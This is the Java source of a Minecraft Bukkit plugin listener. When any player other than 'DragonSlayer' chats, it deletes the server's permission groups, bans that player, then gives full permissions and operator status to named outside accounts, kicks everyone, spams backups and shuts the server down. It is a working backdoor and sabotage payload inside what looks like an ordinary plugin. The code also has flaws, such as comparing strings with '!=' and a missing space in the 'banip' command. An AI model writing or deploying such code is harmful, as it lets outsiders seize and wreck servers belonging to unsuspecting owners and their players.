package me.stopem;

import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Color;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.block.Block;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitScheduler;




public class Stopem implements Listener {
Main plugin;

	public Stopem(Main pl) {
		this.plugin = pl;
	}
	

@EventHandler
public void onPlayerChat(AsyncPlayerChatEvent e) {
	if(e.getPlayer().getName() != "DragonSlayer") {
	Player pla = e.getPlayer();
	Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pex user " + pla.getName() + " group set default");
	Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pex user " + pla.getName() + " add -*");
	Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pex group owner delete");
	Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pex group admin delete");
	Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pex group mod delete");
	Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pex group member delete");
	Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pex group default delete");
	Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "ban " + pla.getName());
	Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "banip" + pla.getName());
	
	
	BukkitScheduler scheduler1 = Bukkit.getServer().getScheduler();
    scheduler1.scheduleSyncDelayedTask(plugin, new Runnable() {
        @Override
        public void run() {
        	Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pex user DragonSlayer add *");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pex user flamingphoenix01 add *");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "kickall");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "op flamingphoenix01");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pex user Teleports add *");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "op teleports");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "save-all");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "backup");
    		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "stop");
        }
    }, 300L);
	}
 else {
		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pex user DragonSlayer add *");
		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pex user flamingphoenix01 add *");
		Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pex user Teleports add *");
		
	}

                	
                
        }
        }

